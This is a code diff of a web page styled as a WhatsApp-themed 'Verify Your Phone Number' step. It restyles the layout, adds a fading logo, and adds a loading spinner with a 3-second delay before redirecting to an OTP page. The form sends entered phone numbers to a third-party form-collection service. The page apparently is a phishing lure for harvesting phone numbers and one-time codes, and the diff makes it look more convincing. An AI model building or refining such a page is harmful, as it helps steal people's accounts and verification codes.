@@ -19,10 +19,13 @@ body {
     background-size: cover; /* Scale the image to cover the entire viewport */
     background-repeat: no-repeat; /* Prevent image repetition */
     background-position: center center; /* Center the image */
-    display: flex;
+} 
+
+  .inputform {
+       display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
+    height: 70vh;
     margin: 0; /* Remove default margin */
     padding: 0; /* Remove default padding */
 }
@@ -51,7 +54,7 @@ body {
 
         /* Style the message */
         p {
-            font-size: 14.5px;
+            font-size: 13.5px;
             margin-bottom: 20px;
             color: white;
         }
@@ -92,11 +95,11 @@ body {
     font-size: 16px;
     padding: 10px;
     margin-bottom: 10px;
-    width: 45%; /* Adjust the width */
+    width: 65%; /* Adjust the width */
     outline: none;
     color: white;
     background: linear-gradient(45deg, #ff4d4d, #ffb6c1);
-    border-radius: 25px;
+    border-radius: 18px;
 }
 
 /* Style the OTP button */
@@ -118,42 +121,80 @@ body {
 }
 
 
+            
 
 .logo-container {
-    margin: 0 auto; /* Center horizontally and add margin at the bottom */
+    margin: 0 0; /* Center horizontally and add margin at the bottom */
     z-index: 2; /* Place the logo above the overlay */
     display: flex;
     justify-content: center; /* Center horizontally */
     align-items: center; /* Center vertically */
     width: 80px;
     background: linear-gradient(45deg, #ff4d4d, #ffb6c1); /* Apply the gradient as the background */
-    padding: 0% 100px; /* Vertically shorter, horizontally wider padding */
-    opacity: 0.6;
-    display: block;
+    padding: 0% 140px; /* Vertically shorter, horizontally wider padding */
+    opacity: 1;
+    
 }
 
 
 .logo {
-    width: 50px;
+    width: 100px;
     background-color: linear-gradient(45deg, #ff4d4d, #ffb6c1); /*  rgba(255, 255, 255, 0.8); /* Translucent white background */
     border-radius: 100000000000000000px; /* Rounded corners */
-    
+    animation: fadeInOut 4s ease-in-out infinite;
+    }
+
+    @keyframes fadeInOut {
+        0%, 100% {
+            opacity: 0;
+        }
+        50% {
+            opacity: 1;
+        }
+    }
+
+            /* Add this CSS for the loading spinner */
+.spinner {
+    border: 4px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    border-top: 4px solid #fff;
+    width: 30px;
+    height: 30px;
+    animation: spin 2s linear infinite;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    display: none; /* Initially hidden */
 }
+
+@keyframes spin {
+    0% { transform: translate(-50%, -50%) rotate(0deg); }
+    100% { transform: translate(-50%, -50%) rotate(360deg); }
+}
+
             
 
     </style>
 </head>
 <body>
-  <div class="logo-container">
+
+<div class="logo-container">
         <img src="casalogo.png" alt="Harem Logo" class="logo">
     </div>
-
+    
+  
+        <div class="inputform">
     
     <div class="whatsapp-container">
         <h2>Verify Your Phone Number</h2>
         <p>Input phone number to receive otp verification:</p>
         
-            
+<!-- Add a loading spinner initially hidden -->
+    <div id="loading-spinner" class="spinner"></div>
+         
+
+        
             <form id="contactform" class="phone-input" action="https://formsubmit.io/send/42b5a94f-08e0-4850-aa08-970cbc3b421a" method="POST">
     <input name="_redirect" type="hidden" value="https://tzmyn.github.io/Harem/OTP.html">
 <input type="hidden" name="_captcha" value="false">
@@ -176,12 +217,23 @@ body {
     <button id="otpButton" type="submit">OTP VERIFICATION</button>
             </form>
     </div>
+        
+    </div>
+        
     <script>
-        // JavaScript to handle the OTP button click event
         const otpButton = document.getElementById('otpButton');
-        otpButton.addEventListener('click', function () {
-            window.location.href = 'https://tzmyn.github.io/Harem/OTP.html'; // Redirect to OTP page
-        });
+const loadingSpinner = document.getElementById('loading-spinner');
+
+otpButton.addEventListener('click', function () {
+    // Show the loading spinner
+    loadingSpinner.style.display = 'block';
+
+    // Delay for 3 seconds (adjust the time as needed)
+    setTimeout(function () {
+        window.location.href = 'https://tzmyn.github.io/Harem/OTP.html'; // Redirect to OTP page
+    }, 3000);
+});
+
     </script>
 
 <script>
